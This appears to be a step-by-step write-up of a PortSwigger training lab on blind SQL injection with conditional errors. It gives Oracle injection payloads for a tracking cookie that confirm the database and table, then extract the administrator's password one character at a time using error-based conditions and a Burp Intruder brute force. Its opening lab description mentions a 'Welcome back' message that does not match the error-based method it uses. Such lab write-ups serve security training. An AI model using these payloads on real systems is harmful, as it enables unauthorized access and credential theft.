https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

Lab objective: `Log in as the administrator user.`

The database contains a different table called `users`, with columns called `username` and `password`.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

# Lab: Blind SQL injection with conditional errors

We know that This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

So we will try on tracking cookies

1. `TrackingId=UyGtiFyqCFVHFTo1'` it give use error and `TrackingId=UyGtiFyqCFVHFTo1''` and this can't give error. so we can use that.
2. `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT '')||'` this query give us error and this query don't give us error `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT '' FROM dual)||'` so we know that the database is `oracle database`
3. Now we will check there have any users table the query will `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT '' FROM users WHERE ROWNUM=1)||'`
4. This query is true so it will give use error (Status cod 500) `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
5. This query is false so it will give use no error (Status cod 200) `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
6. Now we will check there have any username call `administrator` the query will `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
7. Now we will find the length of the password the query will `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20)||'` so the length of the password is 20 character.
8. Now we will send the the query to `intruder tab` and make cluster bomb attack `TrackingId=UyGtiFyqCFVHFTo1' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,§1§,1)='§a§')||'` this 2 will variable. we will use 1 to 20 for the `SUBSTRING` and a to z and 0 to 9 for the `a`.
9. The password is `cyy5fa6r0wgr15b0b36l` (password change every-time).
10. Now login. And solve the lab.